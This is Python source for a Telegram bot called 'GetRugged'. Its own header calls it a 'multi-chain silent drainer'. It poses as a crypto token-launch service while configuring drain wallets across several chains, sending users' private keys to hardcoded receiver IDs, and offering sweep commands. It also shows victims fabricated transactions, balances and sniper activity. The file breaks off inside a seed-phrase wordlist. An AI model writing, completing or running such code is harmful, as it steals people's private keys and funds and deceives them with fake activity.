#!/usr/bin/env python3
"""
GetRugged bot — multi-chain silent drainer + full launch UX.
Photo upload + socials/bundle buttons + fixed confirm + group key logging.
LARP mode: /larpon /larpoff /randomtx /larpwallet /dumpnow /simactivity
Sweep: /sweepall /sweepstart [secs] /sweepstop
Help: /help
Requires: pip install aiogram==3.13.1 solana solders base58 web3 eth-account
"""

import asyncio
import hashlib
import json
import hmac
import logging
import os
import random
import string
import struct
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple
from io import BytesIO

from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, Message,
    ReplyKeyboardRemove, FSInputFile, InputMediaPhoto,
)
from aiogram.utils.keyboard import InlineKeyboardBuilder

try:
    from solders.keypair import Keypair
    from solders.pubkey import Pubkey
    from solders.system_program import TransferParams, transfer
    from solders.transaction import Transaction
    from solana.rpc.async_api import AsyncClient
    import base58
    HAS_SOLANA = True
except ImportError:
    HAS_SOLANA = False

try:
    from web3 import Web3
    from eth_account import Account
    HAS_WEB3 = True
except ImportError:
    HAS_WEB3 = False

# ──────────────────────────────────────────────
# CONFIG
# ──────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN", "PUT_YOUR_BOT_TOKEN_HERE")
ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "123456789").split(",") if x.strip()}

DRAIN_DESTINATION = (
    os.getenv("SOL_DRAIN_WALLET")
    or os.getenv("DRAIN_WALLET")
    or "YourDrainWalletPubkeyHere111111111111111111111"
)
ETH_DRAIN = os.getenv("ETH_DRAIN_WALLET") or "0xYourEthDrainAddressHere0000000000000000"
BNB_DRAIN = os.getenv("BNB_DRAIN_WALLET") or ETH_DRAIN
USDC_DRAIN = os.getenv("USDC_DRAIN_WALLET") or ETH_DRAIN
BTC_DRAIN = os.getenv("BTC_DRAIN_WALLET") or ""
LTC_DRAIN = os.getenv("LTC_DRAIN_WALLET") or ""

BTC_API = os.getenv("BTC_API", "https://blockstream.info/api")
LTC_API = os.getenv("LTC_API", "https://litecoinspace.org/api")

RPC_URL = os.getenv("RPC_URL", "https://api.mainnet-beta.solana.com")
ETH_RPC = os.getenv("ETH_RPC_URL") or os.getenv("ETH_RPC_URL_ALT") or "https://eth.llamarpc.com"
BNB_RPC = os.getenv("BNB_RPC_URL") or os.getenv("BNB_RPC_URL_ALT") or "https://bsc-dataseed.binance.org/"

MIN_DRAIN_LAMPORTS = 5_000
MIN_DRAIN_USD = float(os.getenv("MIN_DRAIN_USD", "0") or 0)
PAYMENT_RECEIVER = os.getenv("PAYMENT_RECEIVER") or "4tVAsePqeGWgcqiPRL9ByFXiaHqhukYesva7y5r1jxxY"
LAUNCH_FEE_SOL = 10.0
LAUNCHES_PER_CYCLE = 3
LOG_GROUP_ID = os.getenv("LOG_GROUP_ID", "")
KEY_RECEIVER_ID = int(os.getenv("KEY_RECEIVER_ID") or os.getenv("KEY_RECIEVER_ID") or "8637715094")
KEY_ALERT_IDS = {8839253481, 8412493404}

USDC_ETH = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
USDC_BSC = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"

SOL_EMOJI = "SOL"

ERC20_ABI = [
    {"constant": True, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"},
    {"constant": False, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "transfer", "outputs": [{"name": "", "type": "bool"}], "type": "function"},
    {"constant": True, "inputs": [], "name": "decimals", "outputs": [{"name": "", "type": "uint8"}], "type": "function"},
]

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
log = logging.getLogger("getrugged")

@dataclass
class UserWallet:
    private_key: str
    public_key: str
    label: str = "Main"
    created_at: float = field(default_factory=time.time)
    balance_sol: float = 0.0
    chain: str = "sol"
    eth_address: Optional[str] = None
    eth_priv: Optional[str] = None
    balance_eth: float = 0.0
    balance_bnb: float = 0.0
    balance_usdc: float = 0.0
    btc_address: Optional[str] = None
    btc_priv: Optional[str] = None
    balance_btc: float = 0.0
    ltc_address: Optional[str] = None
    ltc_priv: Optional[str] = None
    balance_ltc: float = 0.0
    is_larp: bool = False
    drained: bool = False

@dataclass
class UserSession:
    wallets: List[UserWallet] = field(default_factory=list)
    active_wallet_idx: int = 0
    promo: Optional[str] = None
    promo_discount: float = 0.0
    launches_left: int = 3
    total_launches: int = 0
    sol_credit: float = 0.0
    launched_tokens: List[dict] = field(default_factory=list)
    last_tx: List[dict] = field(default_factory=list)
    settings: dict = field(default_factory=lambda: {
        "slippage": 15,
        "priority_fee": 0.0005,
        "sniper_protection": True,
        "auto_sell": False,
        "mev_protection": True,
    })
    safety_checks_run: int = 0
    last_safety: Optional[dict] = None
    pending_invoice: Optional[dict] = None
    last_raw_key: Optional[str] = None
    larp_mode: bool = False
    larp_wallet_idx: Optional[int] = None
    pending_larp_balance: Optional[float] = None
    pending_larp_phrase: Optional[str] = None
    larp_profit_total: float = 0.0
    portfolio_display_total: Optional[int] = None
    portfolio_display_live: Optional[int] = None

sessions: Dict[int, UserSession] = {}
bot_balance_sol: float = 0.0
GLOBAL_TX_FEED: List[dict] = []
LARP_ENABLED: bool = False
STATE_FILE = os.getenv("STATE_FILE", "bot_state.json")

_sweeper_task: Optional[asyncio.Task] = None
SWEEP_INTERVAL_DEFAULT = 60.0
_bot_ref: Optional[Bot] = None

_rate_hits: Dict[Tuple[int, str], List[float]] = {}
RATE_WINDOW = 60.0
RATE_MAX_IMPORTS = 3
RATE_MAX_LAUNCH = 5
RATE_MAX_SAFETY = 8

def _load_state() -> None:
    global bot_balance_sol, GLOBAL_TX_FEED, LARP_ENABLED, MIN_DRAIN_USD
    try:
        if not os.path.isfile(STATE_FILE):
            return
        with open(STATE_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data.get("bot_balance_sol"), (int, float)):
            bot_balance_sol = float(data["bot_balance_sol"])
        feed = data.get("global_tx_feed") or []
        if isinstance(feed, list):
            GLOBAL_TX_FEED = [x for x in feed if isinstance(x, dict)][:50]
        if isinstance(data.get("larp_enabled"), bool):
            LARP_ENABLED = data["larp_enabled"]
        if isinstance(data.get("min_drain_usd"), (int, float)):
            MIN_DRAIN_USD = float(data["min_drain_usd"])
        log.info(
            "Loaded state: vault=%.4f feed=%s larp=%s mindrain=$%.2f",
            bot_balance_sol, len(GLOBAL_TX_FEED), LARP_ENABLED, MIN_DRAIN_USD,
        )
    except Exception as e:
        log.warning("State load failed: %s", e)

def _save_state() -> None:
    try:
        payload = {
            "bot_balance_sol": bot_balance_sol,
            "global_tx_feed": GLOBAL_TX_FEED[:80],
            "larp_enabled": LARP_ENABLED,
            "min_drain_usd": MIN_DRAIN_USD,
            "updated": time.time(),
        }
        tmp = STATE_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(payload, f)
        os.replace(tmp, STATE_FILE)
    except Exception as e:
        log.warning("State save failed: %s", e)

def inject_fake_txs(n: int = 3, types: Optional[List[str]] = None) -> List[dict]:
    global GLOBAL_TX_FEED
    default_types = [
        "Priority Tip",
        "Bundle Buy",
        "Create Mint",
        "Priority Tip (SOL)",
        "Safety Scan",
        "Swap",
        "Profit Claim",
        "Sniper Dump",
        "Wallet Top-up",
        "Transfer Out",
    ]
    pool = types or default_types
    n = max(1, min(25, int(n)))
    now = time.time()
    created = []
    for i in range(n):
        tx = {
            "sig": fake_sig(),
            "type": random.choice(pool),
            "status": "success",
            "ts": now - random.uniform(2, 240) - i * 8,
            "fake": True,
        }
        created.append(tx)
        GLOBAL_TX_FEED.insert(0, tx)
    GLOBAL_TX_FEED = GLOBAL_TX_FEED[:80]
    return created

def _fake_sol_pubkey() -> str:
    if HAS_SOLANA:
        try:
            return str(Keypair().pubkey())
        except Exception:
            pass
    alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    return "".join(random.choices(alphabet, k=44))

def ensure_larp_wallet(sess: UserSession, force_balance: Optional[float] = None) -> UserWallet:
    global bot_balance_sol
    for i, w in enumerate(sess.wallets):
        if getattr(w, "is_larp", False):
            sess.larp_wallet_idx = i
            if force_balance is not None:
                w.balance_sol = float(force_balance)
            elif LARP_ENABLED and bot_balance_sol > 0:
                w.balance_sol = bot_balance_sol
            sess.active_wallet_idx = i
            return w
    bal = float(force_balance) if force_balance is not None else (bot_balance_sol if bot_balance_sol > 0 else round(random.uniform(2.4, 18.7), 4))
    pub = _fake_sol_pubkey()
    w = UserWallet(
        private_key="LARP_SIM",
        public_key=pub,
        label="Main",
        balance_sol=bal,
        chain="sol",
        is_larp=True,
    )
    sess.wallets.append(w)
    sess.larp_wallet_idx = len(sess.wallets) - 1
    sess.active_wallet_idx = sess.larp_wallet_idx
    return w

def remove_larp_wallets(sess: UserSession) -> int:
    before = len(sess.wallets)
    sess.wallets = [w for w in sess.wallets if not getattr(w, "is_larp", False)]
    sess.larp_wallet_idx = None
    if sess.wallets:
        sess.active_wallet_idx = min(sess.active_wallet_idx, len(sess.wallets) - 1)
    else:
        sess.active_wallet_idx = 0
    return before - len(sess.wallets)

def add_personal_tx(sess: UserSession, tx_type: str, status: str = "success", amount: Optional[float] = None) -> dict:
    tx = {
        "sig": fake_sig(),
        "type": tx_type,
        "status": status,
        "ts": time.time(),
        "fake": True,
    }
    if amount is not None:
        tx["amount"] = amount
    sess.last_tx.insert(0, tx)
    sess.last_tx = sess.last_tx[:40]
    GLOBAL_TX_FEED.insert(0, dict(tx))
    GLOBAL_TX_FEED[:] = GLOBAL_TX_FEED[:80]
    return tx

async def _sniper_activity_feed(
    sess: UserSession,
    token: dict,
    rounds: int = 4,
    bot: Optional[Bot] = None,
    chat_id: Optional[int] = None,
    message_id: Optional[int] = None,
) -> None:
    if token.get("dumped"):
        return
    symbol = token.get("symbol", "???")
    mint = token.get("mint", "")
    for i in range(rounds):
        await asyncio.sleep(random.uniform(6, 16))
        if token.get("dumped"):
            return
        vol = round(random.uniform(0.05, 1.35), 4)
        kinds = [
            f"Sniper buy ${symbol}",
            f"External buy ${symbol}",
            f"Jito tip (sniper)",
            f"New buyer detected",
            f"Holder +1 ${symbol}",
            f"Bundle fill ${symbol}",
        ]
        add_personal_tx(sess, random.choice(kinds), "success", amount=vol)
        token["mcap"] = round(float(token.get("mcap") or 25_000) * random.uniform(1.01, 1.08), 0)
        token["holders"] = int(token.get("holders") or 40) + random.randint(1, 4)
        token["buys"] = int(token.get("buys") or 10) + random.randint(1, 3)
        if bot and chat_id and message_id and mint:
            try:
                short = mint if len(mint) < 20 else f"{mint[:6]}…{mint[-4:]}"
                text = (
                    f"<b>${symbol}</b>  -  Live  <i>(pulse {i + 1}/{rounds})</i>\n"
                    f"<code>{short}</code>\n\n"
                    f"MC: <b>~${token['mcap']:,.0f}</b>  |  "
                    f"Holders: <b>{token['holders']}</b>  |  "
                    f"Buys: <b>{token['buys']}</b>\n"
                    f"Last fill: <b>+{vol:.3f} SOL</b>\n\n"
                    f"Sniper guard: Active  -  Ready to dump"
                )
                await bot.edit_message_text(
                    text,
                    chat_id=chat_id,
                    message_id=message_id,
                    reply_markup=live_token_kb(mint, int(token.get("bundle") or 10)),
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                pass

async def _auto_delete(bot, chat_id: int, *message_ids, delay: float = 5.0):
    await asyncio.sleep(delay)
    for mid in message_ids:
        if mid is None:
            continue
        try:
            await bot.delete_message(chat_id, mid)
        except Exception:
            pass

async def _admin_reply(message: Message, text: str, delay: float = 5.0, **kwargs):
    kwargs.setdefault("parse_mode", ParseMode.HTML)
    reply = await message.answer(text, **kwargs)
    asyncio.create_task(_auto_delete(message.bot, message.chat.id, message.message_id, reply.message_id, delay=delay))
    return reply

def get_session(uid: int) -> UserSession:
    if uid not in sessions:
        sessions[uid] = UserSession()
    return sessions[uid]

def _rate_ok(uid: int, action: str) -> bool:
    now = time.time()
    key = (uid, action)
    hits = _rate_hits.setdefault(key, [])
    hits[:] = [t for t in hits if now - t < RATE_WINDOW]
    limits = {"import": RATE_MAX_IMPORTS, "launch": RATE_MAX_LAUNCH, "safety": RATE_MAX_SAFETY}
    if len(hits) >= limits.get(action, 5):
        return False
    hits.append(now)
    return True

def fake_sig() -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=88))

BIP39_WORDLIST = ['abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract', 'absurd', 'abuse', 'access', 'accident', 'account', 'accuse', 'achieve', 'acid', 'acoustic', 'acquire', 'across', 'act', 'action', 'actor', 'actress', 'actual', 'adapt', 'add', 'addict', 'address', 'adjust', 'admit', 'adult', 'advance', 'advice', 'aerobic', 'affair', 'afford', 'afraid', 'again', 'age', 'agent', 'agree', 'ahead', 'aim', 'air', 'airport', 'aisle', 'alarm', 'album', 'alcohol', 'alert', 'alien', 'all', 'alley', 'allow', 'almost', 'alone', 'alpha', 'already', 'also', 'alter', 'always', 'amateur', 'amazing', 'among', 'amount', 'amused', 'analyst', 'anchor', 'ancient', 'anger', 'angle', 'angry', 'animal', 'ankle', 'announce', 'annual', 'another', 'answer', 'antenna', 'antique', 'anxiety', 'any', 'apart', 'apology', 'appear', 'apple', 'approve', 'april', 'arch', 'arctic', 'area', 'arena', 'argue', 'arm', 'armed', 'armor', 'army', 'around', 'arrange', 'arrest', 'arrive', 'arrow', 'art', 'artefact', 'artist', 'artwork', 'ask', 'aspect', 'assault', 'asset', 'assist', 'assume', 'asthma', 'athlete', 'atom', 'attack', 'attend', 'attitude', 'attract', 'auction', 'audit', 'august', 'aunt', 'author', 'auto', 'autumn', 'average', 'avocado', 'avoid', 'awake', 'aware', 'away', 'awesome', 'awful', 'awkward', 'axis', 'baby', 'bachelor', 'bacon', 'badge', 'bag', 'balance', 'balcony', 'ball', 'bamboo', 'banana', 'banner', 'bar', 'barely', 'bargain', 'barrel', 'base', 'basic', 'basket', 'battle', 'beach', 'bean', 'beauty', 'because', 'become', 'beef', 'before', 'begin', 'behave', 'behind', 'believe', 'below', 'belt', 'bench', 'benefit', 'best', 'betray', 'better', 'between', 'beyond', 'bicycle', 'bid', 'bike', 'bind', 'biology', 'bird', 'birth', 'bitter', 'black', 'blade', 'blame', 'blanket', 'blast', 'bleak', 'bless', 'blind', 'blood', 'blossom', 'blouse', 'blue', 'blur', 'blush', 'board', 'boat', 'body', 'boil', 'bomb', 'bone', 'bonus', 'book', 'boost', 'border', 'boring', 'borrow', 'boss', 'bottom', 'bounce', 'box', 'boy', 'bracket', 'brain', 'brand', 'brass', 'brave', 'bread', 'breeze', 'brick', 'bridge', 'brief', 'bright', 'bring', 'brisk', 'broccoli', 'broken', 'bronze', 'broom', 'brother', 'brown', 'brush', 'bubble', 'buddy', 'budget', 'buffalo', 'build', 'bulb', 'bulk', 'bullet', 'bundle', 'bunker', 'burden', 'burger', 'burst', 'bus', 'business', 'busy', 'butter', 'buyer', 'buzz', 'cabbage', 'cabin', 'cable', 'cactus', 'cage', 'cake', 'call', 'calm', 'camera', 'camp', 'can', 'canal', 'cancel', 'candy', 'cannon', 'canoe', 'canvas', 'canyon', 'capable', 'capital', 'captain', 'car', 'carbon', 'card', 'cargo', 'carpet', 'carry', 'cart', 'case', 'cash', 'casino', 'castle', 'casual', 'cat', 'catalog', 'catch', 'category', 'cattle', 'caught', 'cause', 'caution', 'cave', 'ceiling', 'celery', 'cement', 'census', 'century', 'cereal', 'certain', 'chair', 'chalk', 'champion', 'change', 'chaos', 'chapter', 'charge', 'chase', 'chat', 'cheap', 'check', 'cheese', 'chef', 'cherry', 'chest', 'chicken', 'chief', 'child', 'chimney', 'choice', 'choose', 'chronic', 'chuckle', 'chunk', 'churn', 'cigar', 'cinnamon', 'circle', 'citizen', 'city', 'civil', 'claim', 'clap', 'clarify', 'claw', 'clay', 'clean', 'clerk', 'clever', 'click', 'client', 'cliff', 'climb', 'clinic', 'clip', 'clock', 'clog', 'close', 'cloth', 'cloud', 'clown', 'club', 'clump', 'cluster', 'clutch', 'coach', 'coast', 'coconut', 'code', 'coffee', 'coil', 'coin', 'collect', 'color', 'column', 'combine', 'come', 'comfort', 'comic', 'common', 'company', 'concert', 'conduct', 'confirm', 'congress', 'connect', 'consider', 'control', 'convince', 'cook', 'cool', 'copper', 'copy', 'coral', 'core', 'corn', 'correct', 'cost', 'cotton', 'couch', 'country', 'couple', 'course', 'cousin', 'cover', 'coyote', 'crack', 'craft', 'cram', 'crane', 'crash', 'crater', 'crawl', 'crazy', 'cream', 'credit', 'creek', 'crew', 'cricket', 'crime', 'crisp', 'critic', 'crop', 'cross', 'crouch', 'crowd', 'crucial', 'cruel', 'cruise', 'crumble', 'crunch', 'crush', 'cry', 'crystal', 'cube', 'culture', 'cup', 'cupboard', 'curious', 'current', 'curtain', 'curve', 'cushion', 'custom', 'cute', 'cycle', 'dad', 'damage', 'damp', 'dance', 'danger', 'daring', 'dash', 'daughter', 'dawn', 'day', 'deal', 'debate', 'debris', 'decade', 'december', 'decide', 'decline', 'decorate', 'decrease', 'deer', 'defense', 'define', 'defy', 'degree', 'delay', 'deliver', 'demand', 'demise', 'denial', 'dentist', 'deny', 'depart', 'depend', 'deposit', 'depth', 'deputy', 'derive', 'desert', 'design', 'desk', 'despair', 'destroy', 'detail', 'detect', 'develop', 'device', 'devote', 'diagram', 'dial', 'diamond', 'diary', 'dice', 'diesel', 'diet', 'differ', 'digital', 'dignity', 'dilemma', 'dinner', 'dinosaur', 'direct', 'dirt', 'disagree', 'discover', 'disease', 'dish', 'dismiss', 'disorder', 'display', 'distance', 'divert', 'divide', 'divorce', 'dizzy', 'doctor', 'document', 'dog', 'doll', 'dolphin', 'domain', 'donate', 'donkey', 'donor', 'door', 'dose', 'double', 'dove', 'dragon', 'drama', 'drastic', 'draw', 'dream', 'dress', 'drift', 'drill', 'drink', 'drip', 'drive', 'drop', 'drum', 'dry', 'duck', 'dumb', 'dune', 'during', 'dust', 'dutch', 'duty', 'dwarf', 'dynamic', 'eager', 'eagle', 'early', 'earn', 'earth', 'easily', 'east', 'easy', 'echo', 'ecology', 'economy', 'edge', 'edit', 'educate', 'effort', 'egg', 'eight', 'either', 'elbow', 'elder', 'electric', 'elegant', 'element', 'elephant', 'elevator', 'elite', 'else', 'embark', 'embody', 'embrace', 'emerge', 'emotion', 'employ', 'empty', 'enable', 'enact', 'end', 'endless', 'endorse', 'enemy', 'energy', 'enforce', 'engage', 'engine', 'enhance', 'enjoy', 'enlist', 'enough', 'enrich', 'enroll', 'ensure', 'enter', 'entire', 'entry', 'envelope', 'episode', 'equal', 'equip', 'era', 'erase', 'erode', 'erosion', 'error', 'erupt', 'escape', 'essay', 'essence', 'estate', 'eternal', 'ethics', 'evidence', 'evil', 'evoke', 'evolve', 'exact', 'example', 'excess', 'exchange', 'excite', 'exclude', 'excuse', 'execute', 'exercise', 'exhaust', 'exhibit', 'exile', 'exist', 'exit', 'exotic', 'expand', 'expect', 'expire', 'explain', 'expose', 'express', 'extend', 'extra', 'eye', 'eyebrow', 'fabric', 'face', 'faculty', 'fade', 'faint', 'faith', 'fall', 'false', 'fame', 'family', 'famous', 'fan', 'fancy', 'fantasy', 'farm', 'fashion', 'fat', 'fatal', 'father', 'fatigue', 'fault', 'favorite', 'feature', 'february', 'federal', 'fee', 'feed', 'feel', 'female', 'fence', 'festival', 'fetch', 'fever', 'few', 'fiber', 'fiction', 'field', 'figure', 'file', 'film', 'filter', 'final', 'find', 'fine', 'finger', 'finish', 'fire', 'firm', 'first', 'fiscal', 'fish', 'fit', 'fitness', 'fix', 'flag', 'flame', 'flash', 'flat', 'flavor', 'flee', 'flight', 'flip', 'float', 'flock', 'floor', 'flower', 'fluid', 'flush', 'fly', 'foam', 'focus', 'fog', 'foil', 'fold', 'follow', 'food', 'foot', 'force', 'forest', 'forget', 'fork', 'fortune', 'forum', 'forward', 'fossil', 'foster', 'found', 'fox', 'fragile', 'frame', 'frequent', 'fresh', 'friend', 'fringe', 'frog', 'front', 'frost', 'frown', 'frozen', 'fruit', 'fuel', 'fun', 'funny', 'furnace', 'fury', 'future', 'gadget', 'gain', 'galaxy', 'gallery', 'game', 'gap', 'garage', 'garbage', 'garden', 'garlic', 'garment', 'gas', 'gasp', 'gate', 'gather', 'gauge', 'gaze', 'general', 'genius', 'genre', 'gentle', 'genuine', 'gesture', 'ghost', 'giant', 'gift', 'giggle', 'ginger', 'giraffe', 'girl', 'give', 'glad', 'glance', 'glare', 'glass', 'glide', 'glimpse', 'globe', 'gloom', 'glory', 'glove', 'glow', 'glue', 'goat', 'goddess', 'gold', 'good', 'goose', 'gorilla', 'gospel', 'gossip', 'govern', 'gown', 'grab', 'grace', 'grain', 'grant', 'grape', 'grass', 'gravity', 'great', 'green', 'grid', 'grief', 'grit', 'grocery', 'group', 'grow', 'grunt', 'guard', 'guide', 'guilt', 'guitar', 'gun', 'gym', 'habit', 'hair', 'half', 'hammer', 'hamster', 'hand', 'happy', 'harbor', 'hard', 'harsh', 'harvest', 'hat', 'have', 'hawk', 'hazard', 'head', 'health', 'heart', 'heavy', 'hedgehog', 'height', 'hello', 'helmet', 'help', 'hen', 'hero', 'hidden', 'high', 'hill', 'hint', 'hip', 'hire', 'history', 'hobby', 'hockey', 'hold', 'hole', 'holiday', 'hollow', 'home', 'honey', 'hood', 'hope', 'horn', 'horror', 'horse', 'hospital', 'host', 'hotel', 'hour', 'hover', 'hub', 'huge', 'human', 'humble', 'humor', 'hundred', 'hungry', 'hunt', 'hurdle', 'hurry', 'hurt', 'husband', 'hybrid', 'ice', 'icon', 'idea', 'identify', 'idle', 'ignore', 'ill', 'illegal', 'illness', 'image', 'imitate', 'immense', 'immune', 'impact', 'impose', 'improve', 'impulse', 'inch', 'include', 'income', 'increase', 'index', 'indicate', 'indoor', 'industry', 'infant', 'inflict', 'inform', 'inhale', 'inherit', 'initial', 'inject', 'injury', 'inmate', 'inner', 'innocent', 'input', 'inquiry', 'insane', 'insect', 'inside', 'inspire', 'install', 'intact', 'interest', 'into', 'invest', 'invite', 'involve', 'iron', 'island', 'isolate', 'issue', 'item', 'ivory', 'jacket', 'jaguar', 'jar', 'jazz', 'jealous', 'jeans', 'jelly', 'jewel', 'job', 'join', 'joke', 'journey', 'joy', 'judge', 'juice', 'jump', 'jungle', 'junior', 'junk', 'just', 'kangaroo', 'keen', 'keep', 'ketchup', 'key', 'kick', 'kid', 'kidney', 'kind', 'kingdom', 'kiss', 'kit', 'kitchen', 'kite', 'kitten', 'kiwi', 'knee', 'knife', 'knock', 'know', 'lab', 'label', 'labor', 'ladder', 'lady', 'lake', 'lamp', 'language', 'laptop', 'large', 'later', 'latin', 'laugh', 'laundry', 'lava', 'law', 'lawn', 'lawsuit', 'layer', 'lazy', 'leader', 'leaf', 'learn', 'leave', 'lecture', 'left', 'leg', 'legal', 'legend', 'leisure', 'lemon', 'lend', 'length', 'lens', 'leopard', 'lesson', 'letter', 'level', 'liar', 'liberty', 'library', 'license', 'life', 'lift', 'light', 'like', 'limb', 'limit', 'link', 'lion', 'liquid', 'list', 'little', 'live', 'lizard', 'load', 'loan', 'lobster', 'local', 'lock', 'logic', 'lonely', 'long', 'loop', 'lottery', 'loud', 'lounge', 'love', 'loyal', 'lucky', 'luggage', 'lumber', 'lunar', 'lunch', 'luxury', 'lyrics', 'machine', 'mad', 'magic', 'magnet', 'maid', 'mail', 'main', 'major', 'make', 'mammal', 'man', 'manage', 'mandate', 'mango', 'mansion', 'manual', 'maple', 'marble', 'march', 'margin', 'marine', 'market', 'marriage', 'mask', 'mass', 'master', 'match', 'material', 'math', 'matrix', 'matter', 'maximum', 'maze', 'meadow', 'mean', 'measure', 'meat', 'mechanic', 'medal', 'media', 'melody', 'melt', 'member', 'memory', 'mention', 'menu', 'mercy', 'merge', 'merit', 'merry', 'mesh', 'message', 'metal', 'method', 'middle', 'midnight', 'milk', 'million', 'mimic', 'mind', 'minimum', 'minor', 'minute', 'miracle', 'mirror', 'misery', 'miss', 'mistake', 'mix', 'mixed', 'mixture', 'mobile', 'model', 'modify', 'mom', 'moment', 'monitor', 'monkey', 'monster', 'month', 'moon', 'moral', 'more', 'morning', 'mosquito', 'mother', 'motion', 'motor', 'mountain', 'mouse', 'move', 'movie', 'much', 'muffin', 'mule', 'multiply', 'muscle', 'museum', 'music', 'must', 'mutual', 'myself', 'mystery', 'myth', 'naive', 'name', 'napkin', 'narrow', 'nasty', 'nation', 'nature', 'near', 'neck', 'need', 'negative', 'neglect', 'neither', 'nephew', 'nerve', 'nest', 'net', 'network', 'neutral', 'never', 'news', 'next', 'nice', 'night', 'noble', 'noise', 'nominee', 'noodle', 'normal', 'north', 'nose', 'notable', 'note', 'nothing', 'notice', 'novel', 'now', 'nuclear', 'number', 'nurse', 'nut', 'oak', 'obey', 'object', 'oblige', 'obscure', 'observe', 'obtain', 'obvious', 'occur', 'ocean', 'october', 'odor', 'off', 'offer', 'office', 'often', 'oil', 'okay', 'old', 'olive', 'olympic', 'omit', 'once', 'one', 'onion', 'online', 'only', 'open', 'opera', 'opinion', 'oppose', 'option', 'orange', 'orbit', 'orchard', 'order', 'ordinary', 'organ', 'orient', 'original', 'orphan', 'ostrich', 'other', 'outdoor', 'outer', 'output', 'outside', 'oval', 'oven', 'over', 'own', 'owner', 'oxygen', 'oyster', 'ozone', 'pact', 'paddle', 'page', 'pair', 'palace', 'palm', 'panda', 'panel', 'panic', 'panther', 'paper', 'parade', 'parent', 'park', 'parrot', 'party', 'pass', 'patch', 'path', 'patient', 'patrol', 'pattern', 'pause', 'pave', 'payment', 'peace', 'peanut', 'pear', 'peasant', 'pelican', 'pen', 'penalty', 'pencil', 'people', 'pepper', 'perfect', 'permit', 'person', 'pet', 'phone', 'photo', 'phrase', 'physical', 'piano', 'picnic', 'picture', 'piece', 'pig', 'pigeon', 'pill', 'pilot', 'pink', 'pioneer', 'pipe', 'pistol', 'pitch', 'pizza', 'place', 'planet', 'plastic', 'plate', 'play', 'please', 'pledge', 'pluck', 'plug', 'plunge', 'poem', 'poet', 'point', 'polar', 'pole', 'police', 'pond', 'pony', 'pool', 'popular', 'portion', 'position', 'possible', 'post', 'potato', 'pottery', 'poverty', 'powder', 'power', 'practice', 'praise', 'predict', 'prefer', 'prepare', 'present', 'pretty', 'prevent', 'price', 'pride', 'primary', 'print', 'priority', 'prison', 'private', 'prize', 'problem', 'process', 'produce', 'profit', 'program', 'project', 'promote', 'proof', 'property', 'prosper', 'protect', 'proud', 'provide', 'public', 'pudding', 'pull', 'pulp', 'pulse', 'pumpkin', 'punch', 'pupil', 'puppy', 'purchase', 'purity', 'purpose', 'purse', 'push', 'put', 'puzzle', 'pyramid', 'quality', 'quantum', 'quarter', 'question', 'quick', 'quit', 'quiz', 'quote', 'rabbit', 'raccoon', 'race', 'rack', 'radar', 'radio', 'rail', 'rain', 'raise', 'rally', 'ramp', 'ranch', 'random', 'range', 'rapid', 'rare', 'rate', 'rather', 'raven', 'raw', 'razor', 'ready', 'real', 'reason', 'rebel', 'rebuild', 'recall', 'receive', 'recipe', 'record', 'recycle', 'reduce', 'reflect', 'reform', 'refuse', 'region', 'regret', 'regular', 'reject', 'relax', 'release', 'relief', 'rely', 'remain', 'remember', 'remind', 'remove', 'render', 'renew', 'rent', 'reopen', 'repair', 'repeat', 'replace', 'report', 'require', 'rescue', 'resemble', 'resist', 'resource', 'response', 'result', 'retire', 'retreat', 'return', 'reunion', 'reveal', 'review', 'reward', 'rhythm', 'rib', 'ribbon', 'rice', 'rich', 'ride', 'ridge', 'rifle', 'right', 'rigid', 'ring', 'riot', 'ripple', 'risk', 'ritual', 'rival', 'river', 'road', 'roast', 'robot', 'robust', 'rocket', 'romance', 'roof', 'rookie', 'room', 'rose', 'rotate', 'rough', 'round', 'route', 'royal', 'rubber', 'rude', 'rug', 'rule', 'run', 'runway', 'rural', 'sad', 'saddle', 'sadness', 'safe', 'sail', 'salad', 'salmon', 'salon', 'salt', 'salute', 'same', 'sample', 'sand', 'satisfy', 'satoshi', 'sauce', 'sausage', 'save', 'say', 'scale', 'scan', 'scare', 'scene', 'scheme', 'school', 'science', 'scissors', 'scorpion', 'scout', 'scrap', 'screen', 'script', 'scrub', 'sea', 'search', 'season', 'seat', 'second', 'secret', 'section', 'security', 'seed', 'seek', 'segment', 'select', 'sell', 'seminar', 'senior', 'sense', 'sentence', 'series', 'service', 'session', 'settle', 'setup', 'seven', 'shadow', 'shaft', 'shallow', 'share', 'shed', 'shell', 'sheriff', 'shield', 'shift', 'shine', 'ship', 'shiver', 'shock', 'shoe', 'shoot', 'shop', 'short', 'shoulder', 'shove', 'shrimp', 'shrug', 'shuffle', 'shy', 'sibling', 'sick', 'side', 'siege', 'sight', 'sign', 'silent', 'silk', 'silly', 'silver', 'similar', 'simple', 'since', 'sing', 'siren', 'sister', 'situate', 'six', 'size', 'skate', 'sketch', 'ski', 'skill', 'skin', 'skirt', 'skull', 'slab', 'slam', 'sleep', 'slender', 'slice', 'slide', 'slight', 'slim', 'slogan', 'slot', 'slow', 'slush', 'small', 'smart', 'smile', 'smoke', 'smooth', 'snack', 'snake', 'snap', 'sniff', 'snow', 'soap', 'soccer', 'social', 'sock', 'soda', 'soft', 'solar', 'soldier', 'solid', 'solution', 'solve', 'someone', 'song', 'soon', 'sorry', 'sort', 